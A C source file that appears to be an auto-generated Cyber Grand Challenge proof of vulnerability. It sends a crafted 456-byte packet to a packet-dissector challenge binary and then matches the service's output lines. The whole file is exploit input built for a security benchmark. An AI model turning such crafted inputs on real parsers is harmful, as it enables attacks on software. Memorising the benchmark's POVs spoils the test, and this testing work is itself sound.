#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xc8\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xb0\x01\x00\x00\xa8\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xa8\x01\x00\x00"
         "\x50\x0d\xc8\x42\xc9\x24\x36\xe5\x3c\x68\x32\x68\x9a\xf4\x6f\xad"
         "\xd5\x8a\x2a\x30\x50\x00\x00\x00\x01\x00\x77\x36\xb7\xc5\xae\x6b"
         "\x7b\x5d\x01\x71\xdf\x39\x50\x01\x73\x01\x00\x8a\x01\xf7\xcb\x62"
         "\xcf\x78\x79\x6c\x4f\x52\xcf\xaf\x3e\x40\xbb\x4e\x60\xb2\x1d\x66"
         "\x01\x00\x9f\x01\x00\xe5\x9f\x38\xa0\xd3\xb6\xe8\x76\xb2\x27\x41"
         "\x00\xf6\x0d\xd6\x48\xb8\x26\xff\x7f\x8d\x1f\xaa\x30\xfd\xc1\xdd"
         "\xe1\x7c\x03\x36\x05\xdb\x82\x9a\x17\x04\x44\x33\xa7\x0d\xd5\xee"
         "\x7b\x5d\x4b\xaa\xfe\x43\xd5\xa7\x52\x76\xf6\xda\x08\xfa\x55\xc9"
         "\xa1\x10\x15\x00\xe0\xe7\xf7\x76\x13\xde\x86\xa2\x76\x5f\x42\x72"
         "\xc5\xa0\x6a\x88\xa8\x34\x87\x8d\x62\xd1\xae\x9e\x46\xad\x84\xdb"
         "\x60\xe5\xea\x02\x15\x2c\x5c\x84\x20\xb1\x3e\x5d\x56\x9e\xf4\x7f"
         "\xf1\x3c\x86\x56\x75\x85\x3b\xa5\xa3\x28\xaa\x6b\xda\xad\xb8\x56"
         "\x12\x20\x86\x98\xc1\xe0\x24\xe9\x55\x13\xd6\xb0\xa3\xaf\x1a\x38"
         "\x64\x12\x6c\x40\x1a\x69\x99\xc7\xd7\x48\x90\x4c\x3c\x28\x7a\xcb"
         "\xea\xd2\xba\x0f\x2f\x90\x26\x03\x90\x82\xc0\x8d\x51\x21\x78\xf5"
         "\xd4\x26\xe2\x3b\x87\xaa\x9e\x2b\x75\x8f\x2f\x8c\x7b\x81\x83\x84"
         "\x50\xcf\x96\xe7\x5b\xb6\xfa\x7f\x90\xd0\x30\x44\x39\xa9\xe0\xa4"
         "\xe5\xdc\x32\x22\x88\xe9\x47\x94\x55\x10\x5b\x2a\xe7\xc0\x43\x4f"
         "\xe0\xc9\x9e\xde\x15\x30\xf8\xaa\x49\xc3\x27\xaf\x31\xfd\x5a\x26"
         "\xe8\xcc\xcb\x45\x4c\x22\x94\x85\x7b\x02\x29\x26\x85\x97\x2d\x29"
         "\x9b\x3c\xf9\xd7\x8e\x58\xb0\x34\xa2\xe7\x52\x76\x0d\x27\x62\xcc"
         "\x41\x8a\x3b\x68\xcc\x03\x7d\x01\x00\x8a\xd5\x8c\x89\x1d\xf9\x69"
         "\xb3\xa5\x01\x02\xa6\x81\x00\x66\xbb\xdc\x18\x85\x01\x00\x81\x57"
         "\xfd\xa1\xdc\x46\x20\x41\x00\x01\x00\x0a\xbe\xb0\x86\x40\x21\xc6"
         "\x41\x00\x41\x00\x41\x00\xad\x30\x44\x34\x2c\x39\x18\x5e\xbd\xbd"
         "\x90\xdf\x33\xd9\x41\x6d\x0a\x88\xdf\x58\x9c\x8d\x2c\x06\x41\x00"
         "\x0d\x56\x93\xda\x8f\xd8\xbb\x0c";
      static unsigned int write_00001_00000_len = 456;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamapronephros
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x70\x72\x6f\x6e\x65\x70"
         "\x68\x72\x6f\x73";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
